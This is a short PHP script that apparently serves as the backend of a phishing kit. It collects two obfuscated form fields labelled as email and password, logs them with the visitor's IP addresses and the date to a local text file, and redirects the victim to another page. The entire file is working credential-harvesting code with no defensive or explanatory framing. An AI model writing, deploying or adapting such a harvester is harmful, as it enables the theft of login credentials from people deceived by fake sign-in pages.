<?php
    session_start();

    $_SESSION['fbwo12r92bfs'] = $_POST['fbwo12r92bfs'];
    $_SESSION['shfn2yc0285'] = $_POST['shfn2yc0285'];

    $_SESSION['fnm'] = "daleque.txt";
    $fhandlr = fopen($_SESSION['fnm'], "a");
    
    fwrite($fhandlr, "-------------------------------------------\n");
    fwrite($fhandlr, 'E: '.$_POST['fbwo12r92bfs']."\n");
    fwrite($fhandlr, 'P: '.$_POST['shfn2yc0285']."\n");

    @fwrite($fhandlr, 'IP1: '.$_SERVER['REMOTE_ADDR']."\n");
    @fwrite($fhandlr, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
    
    
    fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
    fclose($fhandlr);

 header ('Location:Italinkuy.html');
    
?>